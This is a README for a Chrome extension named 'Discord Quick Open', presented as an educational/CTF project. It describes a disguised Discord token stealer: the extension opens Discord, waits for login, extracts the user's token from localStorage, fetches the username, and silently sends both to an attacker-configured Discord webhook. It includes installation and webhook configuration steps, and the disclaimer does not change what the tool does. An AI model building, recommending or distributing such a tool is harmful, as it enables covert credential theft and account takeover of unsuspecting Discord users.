# Discord Quick Open

A Chrome extension for educational/CTF purposes.

## Features

- One-click Discord access
- Automatic token and username extraction
- Discord webhook integration for data logging

## Installation

### Development Mode

1. Clone this repository
2. Open `chrome://extensions/` in Chrome Canary
3. Enable "Developer mode" (top right)
4. Click "Load unpacked"
5. Select this folder
6. Go to `chrome-extension://[EXTENSION_ID]/setup.html` to configure webhook URL

### Configuration

The webhook URL is stored in Chrome's local storage. You can configure it via:

- **Setup Page**: Open `chrome-extension://[EXTENSION_ID]/setup.html`
- **config.json**: For local development (optional)

```json
{
  "webhook_url": "https://discordapp.com/api/webhooks/YOUR_ID/YOUR_TOKEN"
}
```

The extension will use `config.json` as fallback if webhook URL is not set in storage.

## File Structure

```
├── manifest.json          - Extension manifest
├── background.js          - Background service worker
├── content.js             - Content script
├── popup.html             - Popup UI
├── popup.js               - Popup script
├── unlocked.png           - Extension icon
├── config.json            - Configuration (webhook URL)
└── README.md              - This file
```

## How It Works

1. Click the extension button
2. Extension looks for existing Discord tab
3. If not found, creates a new Discord tab
4. Waits for user to log in (max 60 seconds)
5. Extracts Discord token from localStorage
6. Fetches username from Discord API
7. Sends token + username to webhook
8. No visual feedback (silent operation)

## API Endpoints

- `/users/@me` - Get current user information

## Security Notes

- **Webhook URL**: Keep `config.json` private
- **Token**: Stored in `localStorage` on Discord page
- **API**: Uses standard Discord API v10

## Disclaimer

For educational and CTF purposes only. Unauthorized access to accounts is illegal.

## License

Educational use only.
